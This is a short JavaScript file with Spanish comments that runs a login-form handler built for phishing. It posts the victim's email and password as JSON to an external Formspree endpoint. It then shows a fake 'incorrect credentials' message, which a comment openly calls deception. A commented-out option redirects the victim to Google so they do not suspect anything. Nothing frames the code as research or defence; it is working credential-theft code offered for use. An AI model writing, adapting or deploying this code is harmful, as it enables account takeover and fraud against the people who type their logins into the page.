document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault(); // Evita que la página se recargue normalmente

    const emailInput = document.getElementById('email');
    const passInput = document.getElementById('password');
    const btn = document.getElementById('btnLogin');
    const msg = document.getElementById('message');

    const email = emailInput.value;
    const password = passInput.value;

    // 1. Bloquear botón y cambiar texto para dar sensación de carga
    btn.textContent = "Verificando...";
    btn.disabled = true;
    msg.textContent = "";

    try {
        // 2. Enviar datos a Formspree con TU endpoint específico
        const response = await fetch('https://formspree.io/f/xeaabodk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        if (response.ok) {
            // 3. Engaño: Mostrar mensaje de error común
            setTimeout(() => {
                msg.textContent = "Credenciales incorrectas. Inténtalo de nuevo.";
                msg.style.color = "red";
                
                // Opcional: Si quieres redirigir a Google después del error para que no sospechen:
                // window.location.href = "https://www.google.com";
            }, 1000);
        } else {
            msg.textContent = "Error de conexión. Intenta más tarde.";
        }

    } catch (error) {
        console.error('Error:', error);
        msg.textContent = "Ocurrió un error inesperado.";
    }
});
